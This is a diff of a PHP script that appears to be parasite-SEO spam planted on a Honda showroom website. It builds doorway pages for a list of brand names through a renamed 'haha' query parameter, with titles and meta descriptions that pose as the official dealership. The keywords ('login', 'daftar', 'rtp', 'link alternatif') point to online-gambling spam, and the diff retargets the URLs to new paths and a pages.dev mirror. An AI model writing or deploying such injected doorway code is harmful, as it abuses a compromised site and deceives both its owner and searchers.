@@ -20,7 +20,7 @@ function feedback404()
    
 }
 
-$tunnel = "index";
+$tunnel = "haha";
 $filename = "list.txt";
 
 if (isset($_GET[$tunnel])) {
@@ -59,18 +59,18 @@ if (isset($_GET[$tunnel])) {
 }
 $brand = strtolower($BRAND);
 $baseAuthor = $BRAND;
-$URL  = "https://honda-bsd.com/honda/?index=$BRAND";
-$PAGEURL = "https://honda-bsd.com/honda/?index=$BRAND";
-$AMP = "https://hondaweb.pages.dev/?index=$BRAND";
-$DAFTAR = "https://hondaweb.pages.dev/";
+$URL  = "https://honda-bsd.com/common/?haha=$BRAND";
+$PAGEURL = "https://honda-bsd.com/common/?haha=$BRAND";
+$AMP = "https://honda-common.pages.dev/?haha=$BRAND";
+$DAFTAR = "https://honda-common.pages.dev/";
 $BANNER = "https://i.pinimg.com/1200x/1b/82/8f/1b828f4ba120190782e46d8696c1480f.jpg";
 $LOGO = "https://i.pinimg.com/236x/7c/bb/7d/7cbb7dee13781da18039cee1635d4521.jpg";
 $keyword = "$brand, login $brand, daftar $brand, situs $brand, rtp $brand, link alternatif $brand";
 
 if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
-    $TITLE = "$BRAND: Website Showroom Honda Trimegah BSD";
-    $DESCRIPTION = "$BRAND showroom resmi Honda Trimegah di BSD, menawarkan berbagai model kendaraan Honda terbaru dengan kualitas terbaik. Dengan pelayanan profesional dan ramah, kami siap membantu Anda menemukan mobil impian yang sesuai dengan kebutuhan dan gaya hidup Anda. Kunjungi kami untuk penawaran menarik dan pengalaman berbelanja memuaskan.";
-    $description = "$BRAND showroom resmi Honda Trimegah di BSD, menawarkan berbagai model kendaraan Honda terbaru dengan kualitas terbaik. Dengan pelayanan profesional dan ramah, kami siap membantu Anda menemukan mobil impian yang sesuai dengan kebutuhan dan gaya hidup Anda. Kunjungi kami untuk penawaran menarik dan pengalaman berbelanja memuaskan.";
+    $TITLE = "$BRAND: Portal Website Showroom Honda Trimegah BSD";
+    $DESCRIPTION = "$BRAND Portal showroom resmi Honda Trimegah di BSD, menawarkan berbagai model kendaraan Honda terbaru dengan kualitas terbaik. Dengan pelayanan profesional dan ramah, kami siap membantu Anda menemukan mobil impian yang sesuai dengan kebutuhan dan gaya hidup Anda. Kunjungi kami untuk penawaran menarik dan pengalaman berbelanja memuaskan.";
+    $description = "$BRAND Portal showroom resmi Honda Trimegah di BSD, menawarkan berbagai model kendaraan Honda terbaru dengan kualitas terbaik. Dengan pelayanan profesional dan ramah, kami siap membantu Anda menemukan mobil impian yang sesuai dengan kebutuhan dan gaya hidup Anda. Kunjungi kami untuk penawaran menarik dan pengalaman berbelanja memuaskan.";
 }
 
 ?>
